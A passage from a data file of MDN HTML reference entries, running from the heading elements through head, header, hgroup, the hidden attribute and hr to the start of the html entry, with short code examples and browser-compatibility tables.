headings\n\nThe following code shows all the heading levels, in use.\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n<h5>Heading level 5</h5>\n<h6>Heading level 6</h6>\n```\n\n### Example page\n\nThe following code shows a few headings with some content under them.\n\nhtml\n\n```\n<h1>Heading elements</h1>\n<h2>Summary</h2>\n<p>Some text here…</p>\n\n<h2>Examples</h2>\n<h3>Example 1</h3>\n<p>Some text here…</p>\n\n<h3>Example 2</h3>\n<p>Some text here…</p>\n\n<h2>See also</h2>\n<p>Some text here…</p>\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), heading content, palpable content.                                                                                                                                                                                                          |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                                                                                                                                                                                                                    |\n| Implicit ARIA role                          | [heading](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/heading_role)                                                                                                                                                                                                   |\n| Permitted ARIA roles                        | [`tab`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tab_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) or [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role) |\n| DOM interface                               | [`HTMLHeadingElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLHeadingElement)                                                                                                                                                                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n### html.elements.h1\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h2\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h3\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h4\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h5\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h6\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`<p>`](p)\n- [`<div>`](div)\n- [`<section>`](section)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements)"
- name: head
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<head\\>: The Document Metadata (Header) element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fhead&level=high)\n\nThe `<head>` [HTML](../index) element contains machine-readable information ([metadata](https://developer.mozilla.org/en-US/docs/Glossary/Metadata)) about the document, like its [title](title), [scripts](script), and [style sheets](style). There can be only one `<head>` element in an HTML document.\n\n**Note:** `<head>` primarily holds information for machine processing, not human-readability. For human-visible information, like top-level headings and listed authors, see the [`<header>`](header) element.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`profile`](#profile) Deprecated  \nThe [URI](https://developer.mozilla.org/en-US/docs/Glossary/URI)s of one or more metadata profiles, separated by [white space](https://developer.mozilla.org/en-US/docs/Glossary/Whitespace).\n\n## Examples\n\nhtml\n\n```\n<!doctype html>\n<html lang=\"en-US\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width\" />\n    <title>Document title</title>\n  </head>\n</html>\n```\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |       |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|-------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge  | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `head`    | 1       | 12    | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `profile` | No      | 12–79 | 1–4     | No    | 1–16.4 | No             | No                  | No            | 1–16.4        | No               | No              |     |\n\n## See also\n\n- Elements that can be used inside the `<head>`:\n  - [`<title>`](title)\n  - [`<base>`](base)\n  - [`<link>`](link)\n  - [`<style>`](style)\n  - [`<meta>`](meta)\n  - [`<script>`](script)\n  - [`<noscript>`](noscript)\n  - [`<template>`](template)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/head](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/head)"
- name: header
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<header\\>: The Header element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fheader&level=high)\n\nThe `<header>` [HTML](../index) element represents introductory content, typically a group of introductory or navigational aids. It may contain some heading elements but also a logo, a search form, an author name, and other elements.\n\n## Try it\n\n#### HTML Demo: \\<header\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <header>\n      <a class=\"logo\" href=\"#\">Cute Puppies Express!</a>\n    </header>\n\n    <article>\n      <header>\n        <h1>Beagles</h1>\n        <time>08.12.2014</time>\n      </header>\n      <p>I love beagles <em>so</em> much! Like, really, a lot. They’re adorable and their ears are so, so snugly soft!</p>\n    </article>\n\n    .logo {\n      background: left / cover url('/media/examples/puppy-header-logo.jpg');\n      display: flex;\n      height: 120px;\n      align-items: center;\n      justify-content: center;\n      font:\n        bold calc(1em + 2 * (100vw - 120px) / 100) 'Dancing Script',\n        fantasy;\n      color: #ff0083;\n      text-shadow: #000 2px 2px 0.2rem;\n    }\n\n    header > h1 {\n      margin-bottom: 0;\n    }\n\n    header > time {\n      font: italic 0.7rem sans-serif;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Usage notes\n\nThe `<header>` element has an identical meaning to the site-wide [`banner`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/banner_role) landmark role, unless nested within sectioning content. Then, the `<header>` element is not a landmark.\n\nThe `<header>` element can define a global site header, described as a `banner` in the accessibility tree. It usually includes a logo, company name, search feature, and possibly the global navigation or a slogan. It is generally located at the top of the page.\n\nOtherwise, it is a `section` in the accessibility tree, and usually contains the surrounding section's heading (an `h1` – `h6` element) and optional subheading, but this is **not** required.\n\n### Historical Usage\n\nThe `<header>` element originally existed at the very beginning of HTML for headings. It is seen in [the very first website](https://info.cern.ch/). At some point, headings became [`<h1>` through `<h6>`](heading_elements), allowing `<header>` to be free to fill a different role.\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Accessibility\n\nThe `<header>` element defines a [`banner`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/banner_role) landmark when its context is the [`<body>`](body) element. The HTML header element is not considered a banner landmark when it is descendant of an [`<article>`](article), [`<aside>`](aside), [`<main>`](main), [`<nav>`](nav), or [`<section>`](section) element.\n\n## Examples\n\n### Page Header\n\nhtml\n\n```\n<header>\n  <h1>Main Page Title</h1>\n  <img src=\"mdn-logo-sm.png\" alt=\"MDN logo\" />\n</header>\n```\n\n#### Result\n\n### Article Header\n\nhtml\n\n```\n<article>\n  <header>\n    <h2>The Planet Earth</h2>\n    <p>\n      Posted on Wednesday, <time datetime=\"2017-10-04\">4 October 2017</time> by\n      Jane Smith\n    </p>\n  </header>\n  <p>\n    We live on a planet that's blue and green, with so many things still unseen.\n  </p>\n  <p><a href=\"https://example.com/the-planet-earth/\">Continue reading…</a></p>\n</article>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             ||\n|---------------------------------------------||\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [palpable content](../content_categories#palpable_content|\n| Permitted content                           | [Flow content](../content_categories#flow_content), but with no `<header>` or [`<footer>`](footer) descendant|\n| Tag omission                                | None, both the starting and ending tag are mandatory|\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content). Note that a `<header>` element must not be a descendant of an [`<address>`](address), [`<footer>`](footer) or another `<header>` element|\n| Implicit ARIA role                          | [banner](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/banner_role), or [generic](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role) if a descendant of an [`article`](article), [`aside`](aside), [`main`](main), [`nav`](nav) or [`section`](section) element, or an element with `role=`[`article`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/article_role), [`complementary`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/complementary_role), [`main`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/main_role), [`navigation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/navigation_role) or [`region`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/region_role) |\n| Permitted ARIA roles                        | [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) or [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role|\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement|\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `header` | 5       | 12   | 4       | 11.1  | 5      | 18             | 4                   | 11.1          | 4.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- Other section-related elements: [`<body>`](body), [`<nav>`](nav), [`<article>`](article), [`<aside>`](aside), [h1](heading_elements), [h2](heading_elements), [h3](heading_elements), [h4](heading_elements), [h5](heading_elements), [h6](heading_elements), [`<footer>`](footer), [`<section>`](section), [`<address>`](address).\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/header](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/header)"
- name: headers (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`headers`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/headers)

    [`<td>`](element/td), [`<th>`](element/th)

    IDs of the `<th>` elements which applies to this element.
- name: height (attribute)
  summary: Specifies the height of elements listed here
  belongs_to: Attributes
  description: |-
    `height`

    [`<canvas>`](element/canvas), [`<embed>`](element/embed), [`<iframe>`](element/iframe), [`<img>`](element/img), [`<input>`](element/input), [`<object>`](element/object), [`<video>`](element/video)

    Specifies the height of elements listed here. For all other elements, use the CSS [`height`](https://developer.mozilla.org/en-US/docs/Web/CSS/height) property.

    **Note:** In some instances, such as [`<div>`](element/div), this is a legacy attribute, in which case the CSS [`height`](https://developer.mozilla.org/en-US/docs/Web/CSS/height) property should be used instead.
- name: hgroup
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<hgroup\\>: The Heading Group element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fhgroup&level=high)\n\nThe `<hgroup>` [HTML](../index) element represents a heading and related content. It groups a single [`<h1>–<h6>`](heading_elements) element with one or more [`<p>`](p).\n\n## Try it\n\n#### HTML Demo: \\<hgroup\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <hgroup>\n      <h1>Frankenstein</h1>\n      <p>Or: The Modern Prometheus</p>\n    </hgroup>\n    <p>\n      Victor Frankenstein, a Swiss scientist, has a great ambition: to create intelligent life. But when his creature first\n      stirs, he realizes he has made a monster. A monster which, abandoned by his master and shunned by everyone who sees\n      it, follows Dr Frankenstein to the very ends of the earth.\n    </p>\n\n    hgroup {\n      text-align: right;\n      padding-right: 16px;\n      border-right: 10px solid #00c8d7;\n    }\n\n    hgroup h1 {\n      margin-bottom: 0;\n    }\n\n    hgroup p {\n      margin: 0;\n      font-weight: bold;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nThe `<hgroup>` element allows the grouping of a heading with any secondary content, such as subheadings, an alternative title, or tagline. Each of these types of content represented as a `<p>` element within the `<hgroup>`.\n\nThe `<hgroup>` itself has no impact on the document outline of a web page. Rather, the single allowed heading within the `<hgroup>` contributes to the document outline.\n\n## Examples\n\nhtml\n\n```\n<!doctype html>\n<title>HTML Standard</title>\n<body>\n  <hgroup id=\"document-title\">\n    <h1>HTML: Living Standard</h1>\n    <p>Last Updated 12 July 2022</p>\n  </hgroup>\n  <p>Some intro to the document.</p>\n  <h2>Table of contents</h2>\n  <ol id=\"toc\">\n    …\n  </ol>\n  <h2>First section</h2>\n  <p>Some intro to the first section.</p>\n</body>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                            |\n|---------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), heading content, palpable content.                                                                                                                                                                     |\n| Permitted content                           | Zero or more [`<p>`](p) elements, followed by one [h1](heading_elements), [h2](heading_elements), [h3](heading_elements), [h4](heading_elements), [h5](heading_elements), or [h6](heading_elements) element, followed by zero or more [`<p>`](p) elements. |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                      |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                                                                                                                                                                               |\n| Implicit ARIA role                          | [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role)                                                                                                                                                                |\n| Permitted ARIA roles                        | Any                                                                                                                                                                                                                                                        |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                                                                                                              |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `hgroup` | 5       | 12   | 4       | 11.1  | 5      | 18             | 4                   | 11.1          | 4.2           | 1.0              | 2.2             |     |\n\n## See also\n\n- Others section-related elements: [`<body>`](body), [`<article>`](article), [`<section>`](section), [`<aside>`](aside), [h1](heading_elements), [h2](heading_elements), [h3](heading_elements), [h4](heading_elements), [h5](heading_elements), [h6](heading_elements), [`<nav>`](nav), [`<header>`](header), [`<footer>`](footer), [`<address>`](address);\n- [Sections and outlines of an HTML document](heading_elements).\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/hgroup](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/hgroup)"
- name: hidden (attribute)
  summary: The hidden global attribute is an enumerated attribute indicating that the browser should not render the contents of the element
  description: "# hidden\n\nThe `hidden` [global attribute](../global_attributes) is an [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute indicating that the browser should not render the contents of the element. For example, it can be used to hide elements of the page that can't be used until the login process has been completed.\n\n## Try it\n\n#### HTML Demo: hidden\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>This content should be read right now, as it is important. I am so glad you are able to find it!</p>\n\n    <p hidden>This content is not relevant to this page right now, so should not be seen. Nothing to see here. Nada.</p>\n\n    p {\n      background: #ffe8d4;\n      border: 1px solid #f69d3c;\n      padding: 5px;\n      border-radius: 5px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Description\n\nThe `hidden` attribute is used to indicate that the content of an element should not be presented to the user. This attribute can take any one of the following values:\n\n- an empty string\n- the keyword `hidden`\n- the keyword `until-found`\n\nThere are two states associated with the `hidden` attribute: the *hidden* state and the *hidden until found* state.\n\n- An empty string, or the keyword `hidden`, set the element to the *hidden* state. Additionally, invalid values set the element to the *hidden* state.\n- The keyword `until-found` sets the element to the *hidden until found* state.\n\nThus, all the following set the element to the [*hidden*](#the_hidden_state) state:\n\nhtml\n\n```\n<span hidden>I'm hidden</span>\n<span hidden=\"\">I'm also hidden</span>\n<span hidden=\"hidden\">I'm hidden too!</span>\n```\n\nThe following sets the element to the [*hidden until found*](#the_hidden_until_found_state) state:\n\nhtml\n\n```\n<span hidden=\"until-found\">I'm hidden until found</span>\n```\n\nThe `hidden` attribute must not be used to hide content just from one presentation. If something is marked hidden, it is hidden from all presentations, including, for instance, screen readers.\n\nHidden elements shouldn't be linked from non-hidden elements. For example, it would be incorrect to use the `href` attribute to link to a section marked with the `hidden` attribute. If the content is not applicable or relevant, then there is no reason to link to it.\n\nIt would be fine, however, to use the ARIA [`aria-describedby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-describedby) attribute to refer to descriptions that are themselves hidden. While hiding the descriptions implies that they are not useful on their own, they could be written in such a way that they are useful in the specific context of being referenced from the element that they describe.\n\nSimilarly, a canvas element with the `hidden` attribute could be used by a scripted graphics engine as an off-screen buffer, and a form control could refer to a hidden form element using its form attribute.\n\nElements that are descendants of a hidden element are still active, which means that script elements can still execute and form elements can still submit.\n\n### The hidden state\n\nThe *hidden* state indicates that the element is not currently relevant to the page, or that it is being used to declare content for reuse by other parts of the page and should not be directly presented to the user. The browser will not render elements that are in the *hidden* state.\n\nWeb browsers may implement the *hidden* state using `display: none`, in which case the element will not participate in page layout. This also means that changing the value of the CSS [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) property on an element in the *hidden* state will override the state. For instance, elements styled `display: block` will be displayed despite the `hidden` attribute's presence.\n\n### The hidden until found state\n\nIn the *hidden until found* state, the element is hidden but its content will be accessible to the browser's \"find in page\" feature or to fragment navigation. When these features cause a scroll to an element in a *hidden until found* subtree, the browser will:\n\n- fire a [`beforematch`](https://developer.mozilla.org/en-US/docs/Web/API/Element/beforematch_event) event on the hidden element\n- remove the `hidden` attribute from the element\n- scroll to the element\n\nThis enables a developer to collapse a section of content, but make it searchable and accessible via fragment navigation.\n\nNote that browsers typically implement *hidden until found* using [`content-visibility: hidden`](https://developer.mozilla.org/en-US/docs/Web/CSS/content-visibility). This means that unlike elements in the *hidden* state, elements in the *hidden until found* state will have generated boxes, meaning that:\n\n- the element will participate in page layout\n- margin, borders, padding, and background for the element will be rendered.\n\nAlso, the element needs to be affected by [layout containment](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_containment) in order to be revealed. This means that if the element in the *hidden until found* state has a `display` value of `none`, `contents`, or `inline`, then the element will not be revealed by find in page or fragment navigation.\n\n## Examples\n\n### Using until-found\n\nIn this example we have:\n\n- Three [`<div>`](../element/div) elements. The first and the third are not hidden, while the second has `hidden=\"until-found\"` and `id=\"until-found-box\"` attributes.\n- A link whose target is the `\"until-found-box\"` fragment.\n\nThe hidden until found element has a dotted red border and a gray background.\n\nWe also have some JavaScript that listens for the `beforematch` event firing on the hidden until found element. The event handler changes the text content of the box.\n\n#### HTML\n\nhtml\n\n```\n<a href=\"#until-found-box\">Go to hidden content</a>\n\n<div>I'm not hidden</div>\n<div id=\"until-found-box\" hidden=\"until-found\">Hidden until found</div>\n<div>I'm not hidden</div>\n```\n\n#### CSS\n\ncss\n\n```\ndiv {\n  height: 40px;\n  width: 300px;\n  border: 5px dashed black;\n  margin: 1rem 0;\n  padding: 1rem;\n  font-size: 2rem;\n}\n\ndiv#until-found-box {\n  color: red;\n  border: 5px dotted red;\n  background-color: lightgray;\n}\n```\n\n#### JavaScript\n\njs\n\n```\nconst untilFound = document.querySelector(\"#until-found-box\");\nuntilFound.addEventListener(\n  \"beforematch\",\n  () => (untilFound.textContent = \"I've been revealed!\"),\n);\n```\n\n#### Result\n\nNote that although the content of the element is hidden, the element still has a generated box, occupying space in the layout and with background and borders rendered.\n\nClicking the \"Go to hidden content\" button navigates to the hidden until found element. The `beforematch` event fires, the text content is updated, and the element content is displayed.\n\nTo run the example again, click \"Reset\".\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`HTMLElement.hidden`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/hidden)\n- All [global attributes](../global_attributes)\n- The [`aria-hidden`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-hidden) attribute\n- The [`beforematch`](https://developer.mozilla.org/en-US/docs/Web/API/Element/beforematch_event) event\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/hidden](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/hidden)"
- name: high (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`high`](element/meter#high)

    [`<meter>`](element/meter)

    Indicates the lower bound of the upper range.
- name: hr
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<hr\\>: The Thematic Break (Horizontal Rule) element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fhr&level=high)\n\nThe `<hr>` [HTML](../index) element represents a thematic break between paragraph-level elements: for example, a change of scene in a story, or a shift of topic within a section.\n\n## Try it\n\n#### HTML Demo: \\<hr\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>§1: The first rule of Fight Club is: You do not talk about Fight Club.</p>\n\n    <hr />\n\n    <p>§2: The second rule of Fight Club is: Always bring cupcakes.</p>\n\n    hr {\n      border: none;\n      border-top: 3px double #333;\n      color: #333;\n      overflow: visible;\n      text-align: center;\n      height: 5px;\n    }\n\n    hr::after {\n      background: #fff;\n      content: '§';\n      padding: 0 4px;\n      position: relative;\n      top: -13px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nHistorically, this has been presented as a horizontal rule or line. While it may still be displayed as a horizontal rule in visual browsers, this element is now defined in semantic terms, rather than presentational terms, so if you wish to draw a horizontal line, you should do so using appropriate CSS.\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n[`align`](#align) Deprecated Non-standard  \nSets the alignment of the rule on the page. If no value is specified, the default value is `left`.\n\n[`color`](#color) Deprecated Non-standard  \nSets the color of the rule through color name or hexadecimal value.\n\n[`noshade`](#noshade) Deprecated Non-standard  \nSets the rule to have no shading.\n\n[`size`](#size) Deprecated Non-standard  \nSets the height, in pixels, of the rule.\n\n[`width`](#width) Deprecated Non-standard  \nSets the length of the rule on the page through a pixel or percentage value.\n\n## Example\n\n### HTML\n\nhtml\n\n```\n<p>\n  This is the first paragraph of text. This is the first paragraph of text. This\n  is the first paragraph of text. This is the first paragraph of text.\n</p>\n\n<hr />\n\n<p>\n  This is the second paragraph of text. This is the second paragraph of text.\n  This is the second paragraph of text. This is the second paragraph of text.\n</p>\n```\n\n### Result\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<p>`](p)\n- [`<hr>` in `<select>`](select#select_with_grouping_options)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/hr](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/hr)"
- name: href (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`href`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/href)

    [`<a>`](element/a), [`<area>`](element/area), [`<base>`](element/base), [`<link>`](element/link)

    The URL of a linked resource.
- name: hreflang (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`hreflang`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/hreflang)

    [`<a>`](element/a), [`<link>`](element/link)

    Specifies the language of the linked resource.
- name: html
  summary: This feature is well established and works across many devices and browser versions
